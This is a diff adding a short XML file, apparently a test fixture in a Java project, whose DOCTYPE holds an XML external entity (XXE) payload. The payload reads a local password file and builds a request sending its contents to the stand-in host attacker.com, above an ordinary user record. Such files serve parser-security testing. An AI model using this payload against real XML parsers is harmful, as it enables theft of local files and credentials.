@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+        <!ENTITY % malicious SYSTEM "file:///D:/develop_tools/IntelliJ IDEA 2022.2.2/ideaProjects/MyProjects/MyRefactor/src/main/resources/passwordd.txt">
+        <!ENTITY % data SYSTEM "data:,<data>[%malicious;]</data>">
+        <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%data;'>">
+        %all;
+        ]>
+<users>
+    <user>
+        <name>John Doe</name>
+        <email>john@example.com</email>
+    </user>
+</users>
